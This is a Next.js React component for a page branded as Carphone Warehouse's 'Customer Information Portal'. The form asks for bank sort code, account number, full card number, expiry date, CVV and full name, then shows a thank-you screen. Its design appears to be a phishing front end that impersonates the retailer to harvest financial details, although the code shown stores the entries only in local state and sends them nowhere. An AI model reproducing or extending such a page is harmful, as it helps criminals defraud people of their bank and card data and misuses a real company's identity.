"use client";

import Image from "next/image";
import { useState } from "react";

export default function CustomerForm() {
  const [form, setForm] = useState({
    sortCode: "",
    accountNumber: "",
    cardNumber: "",
    name: "",
    expireDate: "",
    cardValidationValue: "",
  });

  const [submitted, setSubmitted] = useState(false);

  const inputClass =
    "mt-2 w-full rounded-xl border border-slate-200 bg-white px-4 py-3 text-sm text-slate-800 outline-none transition placeholder:text-slate-400 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10";

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setSubmitted(true);
  };

  if (submitted) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-slate-50 p-4">
        <div className="w-full max-w-lg overflow-hidden rounded-2xl border border-slate-200 bg-white text-center shadow-xl">
          <div className="bg-[#050d26] px-6 py-5">
            <Image
              src="/logo.png"
              alt="Carphone Warehouse"
              width={420}
              height={420}
              className="mx-auto h-auto w-40 object-contain"
            />
          </div>

          <div className="p-8 sm:p-10">


            <h2 className="mt-5 text-2xl font-bold text-slate-900">
              Thank You, {form.name}!
            </h2>

            <p className="mt-3 text-sm leading-7 text-slate-500">
              Your information has been submitted successfully.
              Thank you for your time.
            </p>

            <button
              onClick={() => setSubmitted(false)}
              className="mt-7 rounded-xl bg-blue-600 px-6 py-3 text-sm font-semibold text-white transition hover:bg-blue-700"
            >
              Back to Form
            </button>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-slate-100 px-4 py-10 sm:py-14">
      <div className="mx-auto max-w-3xl overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-xl shadow-slate-300/30">

        {/* Professional Brand Header */}
        <header className="relative overflow-hidden bg-[#050d26] px-6 py-8 sm:py-10">
          <div className="absolute inset-0 bg-gradient-to-br from-blue-950 via-[#050d26] to-slate-950" />

          <div className="relative flex flex-col items-center">
            <Image
              src="/logo.png"
              alt="Carphone Warehouse Logo"
              width={420}
              height={420}
              priority
              className="h-auto w-48 object-contain sm:w-56"
            />

            <div className="mt-5 h-1 w-16 rounded-full bg-cyan-400" />

            <p className="mt-4 text-center text-xs font-semibold uppercase tracking-[0.22em] text-cyan-200 sm:text-sm">
              Customer Information Portal
            </p>
          </div>
        </header>

        {/* Form Content */}
        <div className="p-6 sm:p-10">
          <div className="mb-8">
            <h1 className="text-2xl font-bold tracking-tight text-slate-900 sm:text-3xl">
              Customer Information
            </h1>

            <p className="mt-2 text-sm leading-6 text-slate-500">
              Please complete the form below with your details.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="grid grid-cols-1 gap-5 sm:grid-cols-2">
              <div>
                <label className="text-sm font-medium text-slate-700">
                  Sort Code
                </label>
                <input
                  name="sortCode"
                  value={form.sortCode}
                  onChange={handleChange}
                  required
                  placeholder="Enter sort code"
                  className={inputClass}
                />
              </div>

              <div>
                <label className="text-sm font-medium text-slate-700">
                  Account Number
                </label>
                <input
                  name="accountNumber"
                  value={form.accountNumber}
                  onChange={handleChange}
                  required
                  placeholder="Enter account number"
                  className={inputClass}
                />
              </div>

              <div className="sm:col-span-2">
                <label className="text-sm font-medium text-slate-700">
                  Card Number
                </label>
                <input
                  name="cardNumber"
                  value={form.cardNumber}
                  onChange={handleChange}
                  required
                  placeholder="Enter card number"
                  className={inputClass}
                />
              </div>

              <div className="sm:col-span-2">
                <label className="text-sm font-medium text-slate-700">
                  Full Name
                </label>
                <input
                  name="name"
                  value={form.name}
                  onChange={handleChange}
                  required
                  autoComplete="name"
                  placeholder="Enter your full name"
                  className={inputClass}
                />
              </div>

              <div className="sm:col-span-2">
                <label className="text-sm font-medium text-slate-700">
                  Card Expiry Date
                </label>
                <input
                  name="expireDate"
                  type="month"
                  value={form.expireDate}
                  onChange={handleChange}
                  required
                  className={inputClass}
                />
              </div>

              <div className="sm:col-span-2">
                <label className="text-sm font-medium text-slate-700">
                  Card Validation Value (CVV)
                </label>
                <input
                  name="cardValidationValue"
                  value={form.cardValidationValue}
                  onChange={handleChange}

                  placeholder="Enter Card Validation Value"
                  className={inputClass}
                />
              </div>
            </div>

            <div className="border-t border-slate-100 pt-6">
              <h2 className="text-base font-semibold text-slate-900">
                Additional Information
              </h2>
              <p className="mt-1 text-sm leading-6 text-slate-500">
                Please review your information before submitting.
              </p>
            </div>

            <button
              type="submit"
              className="flex w-full items-center justify-center rounded-xl bg-blue-600 px-5 py-3.5 text-sm font-semibold text-white shadow-sm transition hover:bg-blue-700 focus:outline-none focus:ring-4 focus:ring-blue-500/20"
            >
              Submit Details
              <span className="ml-2" aria-hidden="true">→</span>
            </button>

            <p className="text-center text-xs text-slate-400">
              Thank you for providing your information.
            </p>
          </form>
        </div>

        <footer className="border-t border-slate-100 px-6 py-4 text-center">
          <p className="text-xs text-slate-400">
            Carphone Warehouse
          </p>
        </footer>
      </div>
    </main>
  );
}
